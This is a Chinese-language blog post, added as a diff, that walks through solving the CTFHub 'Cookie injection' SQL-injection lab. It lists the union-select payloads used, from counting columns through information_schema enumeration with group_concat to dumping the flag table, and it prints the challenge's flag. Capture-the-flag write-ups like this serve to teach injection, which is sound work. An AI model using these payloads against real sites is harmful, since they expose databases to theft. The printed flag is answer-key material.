@@ -1,0 +1,54 @@
+---
+layout: post
+title: "CTFHub SQL注入 - Cookie注入"
+date: 2026-10-13
+categories: ctfhub
+tags: [ctfhub,web,sql注入,Cookie注入,union注入]
+permalink: /ctfhub/sql-cookie-sqli.html
+---
+
+# CTFHub SQL注入 - Cookie注入
+## 一、题目信息
+平台：CTFHub
+分类：Web - SQL注入
+题目名称：Cookie注入
+难度：简单
+Flag：`ctfhub{584f58d5591ee5615932c643}`
+
+## 二、考点
+1. Cookie型SQL注入，注入点在Cookie参数内，不是GET/POST参数
+2. Union联合查询注入利用
+3. MySQL元数据库`information_schema`查询库、表、字段
+4. 利用`group_concat`一次性导出多条数据
+
+## 三、题目内容
+访问靶场页面，页面接收Cookie中的id参数带入SQL查询。页面会回显后端执行的SQL语句，输入不同id会展示对应查询结果。正常访问时执行SQL：`select * from news where id=1`。
+注入点位于Cookie的id字段，直接修改Cookie中的id值即可构造SQL语句，执行联合查询。
+
+## 四、解题步骤
+1. 判断注入点与字段数
+修改Cookie中id参数，使用`1 order by 3`，页面报错；`1 order by 2`正常返回。得出查询结果一共2列。
+
+2. 查询当前数据库名
+构造Payload：`-1 union select 1,database()`
+执行后得到数据库名：`sqli`
+
+3. 查询库内所有表名
+构造Payload：`-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`
+返回表：`gztycweezr,news`，news是新闻表，flag存储在`gztycweezr`表。
+
+4. 查询目标表的字段名
+构造Payload：`-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='gztycweezr'`
+得到字段：`wrgmgwxigc`
+
+5. 查询flag数据
+构造Payload：`-1 union select 1,wrgmgwxigc from gztycweezr`
+页面回显拿到最终flag。
+
+## 五、知识点解析
+1. Cookie注入：服务端读取Cookie里面的值直接拼接进SQL语句，没有过滤，因此Cookie参数可以作为注入点。很多人只会关注URL参数、POST表单，容易忽略Cookie。
+2. union联合查询：`union`可以合并两条select查询的结果，要求前后两个查询字段数量保持一致。使用`id=-1`让前面查询无结果，只展示union后面我们自定义查询的数据。
+3. group_concat函数：可以把多条查询结果合并成一行字符串返回，一次性拿到所有表名/字段名，减少多次查询。
+
+## 六、总结
+本题属于简单的联合查询注入，和普通GET型注入原理几乎一致，唯一区别是注入点位置在Cookie中。只需要修改Cookie内id的值来注入，后续库、表、字段查询流程和普通整数型union注入完全相同。解题重点在于发现注入点位置，不要只盯着URL寻找注入点。
